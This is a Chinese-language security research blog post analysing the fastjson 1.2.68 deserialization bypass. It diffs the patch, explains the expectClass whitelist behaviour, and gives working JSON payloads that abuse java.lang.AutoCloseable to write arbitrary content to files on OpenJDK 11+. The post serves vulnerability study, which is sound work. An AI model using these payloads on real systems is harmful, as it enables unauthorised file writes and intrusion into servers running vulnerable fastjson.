---
title: fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记
date: 2020-06-12 22:15:32
tags: [java, web]
---

以此祭奠找 gadgets 逝去的青春, orz

<!-- more -->

## 漏洞原因

既然已经出了补丁, 首先 diff 一下新版本与旧版本的差别, 这里因为 fastjson 会更新旧版本, 自然优先去 diff 旧版本的 sec 更新. 而不是去看 git log, 这样可以节省点时间, 因为 sec 更新只包含漏洞修补, 没有 feature 的更新.  

这里挑了 1.2.48 版本:  
https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec09/  
https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48.sec10/

```diff
$ diff 1.2.48-sec09/com/alibaba/fastjson/parser/ParserConfig.java  1.2.48-sec10/com/alibaba/fastjson/parser/ParserConfig.java
71a72
>     public static final String    SAFE_MODE_PROPERTY        = "fastjson.parser.safeMode";
75a77
>     public static  final boolean  SAFE_MODE;
87a90,93
>             String property = IOUtils.getStringProperty(SAFE_MODE_PROPERTY);
>             SAFE_MODE = "true".equals(property);
>         }
>         {
185a192
>     private boolean                                         safeMode               = SAFE_MODE;
214a222,224
>                 0xD54B91CC77B239EDL,
>                 0xD59EE91F0B09EA01L,
>                 0xD8CA3D595E982BACL,
244a255
>                 0x1CD6F11C6A358BB7L,
273a285
>                 0x535E552D6F9700C1L,
291c303,305
<                 0x7AA7EE3627A19CF3L
---
>                 0x7AA7EE3627A19CF3L,
>                 0x7ED9311D28BF1A65L,
>                 0x7ED9481D28BF417AL
497a512,519
>     public boolean isSafeMode() {
>         return safeMode;
>     }
> 
>     public void setSafeMode(boolean safeMode) {
>         this.safeMode = safeMode;
>     }
> 
1033a1056,1059
>         if (this.safeMode) {
>             throw new JSONException("safeMode not support autoType : " + typeName);
>         }
> 
1038,1045c1064,1075
<             if (expectClass == Object.class
<                     || expectClass == Serializable.class
<                     || expectClass == Cloneable.class
<                     || expectClass == Closeable.class
<                     || expectClass == EventListener.class
<                     || expectClass == Iterable.class
<                     || expectClass == Collection.class
<                     ) {
---
>             long expectHash = TypeUtils.fnv1a_64(expectClass.getName());
>             if (expectHash == 0x90a25f5baa21529eL
>                     || expectHash == 0x2d10a5801b9d6136L
>                     || expectHash == 0xaf586a571e302c6bL
>                     || expectHash == 0xed007300a7b227c6L
>                     || expectHash == 0x295c4605fd1eaa95L
>                     || expectHash == 0x47ef269aadc650b4L
>                     || expectHash == 0x6439c4dff712ae8bL
>                     || expectHash == 0xe3dd9875a2dc5283L
>                     || expectHash == 0xe2a8ddba03e69e0dL
>                     || expectHash == 0xd734ceb4c3e9d1daL
>             ) {
```

明显看到 expectClass 的判断出了变化, 甚至加了层 hash, 有种此地无银三百两的味道 233.  
这里修改下 fastjson-blacklist, 改成用 `TypeUtils.fnv1a_64` 来计算 hash, 可以得到新增了三个类型的判断, `java.lang.AutoCloseable`, `java.lang.Readable`, `java.lang.Runnable`.  

这里稍微跟了下程序, 发现 expectClass 的作用其实相当于一个临时白名单, 这里有两个特性:  

1. 比如有个  
```java
public interface Face {

}

public class Test implements Face {
    String aaa;

    public void setAaa(String aaa) {
        this.aaa = aaa;
    }
}

public class Test2 {
    Face test;

    public void setTest(Face test) {
        this.test = test;
    }
}
```

那么通过 `JSON.parseObject("{\"test\":{\"@type\": \"Test\", \"aaa\": \"zz\"}}", Test2.class);` 是可以反序列化的, fastjson 会对当前反序列化类的 field 的类型作为 type 传进 `JavaBeanDeserializer.deserialze`. 最后成为 expectClass 代入 checkAutoType 中, 如果 @type 指定的类是 expectClass 的子类, 就可以在黑名单不禁止的情况下通过检查, 这样就可以为 interface 制定类.  

2. 还有一个特性, 那就是会直接为 field 创建 JavaBeanDeserializer, 这个更强一些, 无视黑名单以及白名单, 但是前提有一个类的 field (或者 setter) 使用了才行. 比如:  
```java
public static class Test2 {
    java.lang.Thread test;

    public void setTest(java.lang.Thread test) {
        this.test = test;
    }
}
```
`JSON.parseObject("{\"test\":{\"@type\":\"java.lang.Thread\"}}", Test2.class);` 会直接将 Thread 反序列化, 无视了黑名单 (实际上直接绕过了 checkAutoType, SafeMode 下依然可以反序列化), 但这个明显鸡肋很多, 毕竟那些危险类一般情况下都是没用的. 没人会作为 filed 来使用.  

这次漏洞也是因为特性 1 的原因. 但还有一个原因才能导致漏洞, 那就是 AutoCloseable 是在内置的反序列化 classMappings 中的, 没错, 就是之前缓存绕过 autoType 的那个 mapping. 所以导致了 AutoCloseable 是能直接被反序列化的, 这里可以根据特性一, 构造

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "java.io.FileOutputStream",
    "file": "/tmp/asdasd",
    "append": true
}
```

这样可以直接绕过 autoType 的检查, 得到 java.io.FileOutputStream, 此处是直接用 `"@type": "java.lang.AutoCloseable"` 构造出了 JavaBeanDeserializer, 而不是跟上面的例子一样通过 filed 的方式. 相信看到这里, 就已经有想法了, 可以通过 AutoCloseable 的子类来完成相关的攻击.  


## 漏洞修复

修复方式从上面的 diff 中可以看出是在原来的基础上加了几个, 实际上可以看到原来本身就是有防御的, 因为有些内置类是以 Object 作为 setter, 构造函数的参数类型的, 如果不 ban 掉, 就可以直接反序列化任意类了. 这次的漏洞更像是某种意义上的黑名单被绕过, 不过可以看到 AutoCloseable 是 Closeble 的父类, 不知道为什么会在 Closeble 已经被 ban 掉的情况下忘记添加 AutoCloseable, 可能是忘记了? 233


## 漏洞利用

这里分享一条我找到的不需要三方库的链, 注意虽然不需要三方库, 但只能在 openjdk >= 11 下利用, 因为只有这些版本没去掉符号信息. fastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的, 所以可以多利用一些内部类, 但是 openjdk 8, 包括 oracle jdk 都是不带这些信息的, 导致无法反序列化, 自然也就无法利用. 所以相对比较鸡肋, 仅供学习. orz  

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```

大致思路是从上面已经写出来的 FileOutputStream 开始, 找到一个能往里面指定写入内容的类, 这里要一次传入两个参数, 所以只能通过构造函数或者两个 setter 来设置, 比较尴尬的是没有找到可以直接触发的, 还需要再调用一次 write/close/flush 才能真正写入内容, 最后又找到了 `sun.rmi.server.MarshalOutputStream`, 可以写入不可控内容, 才真正完成 exp.  

这里可以通过反射来暴力搜索函数相关参数, 加快搜索过程, 但也是很麻烦的 orz
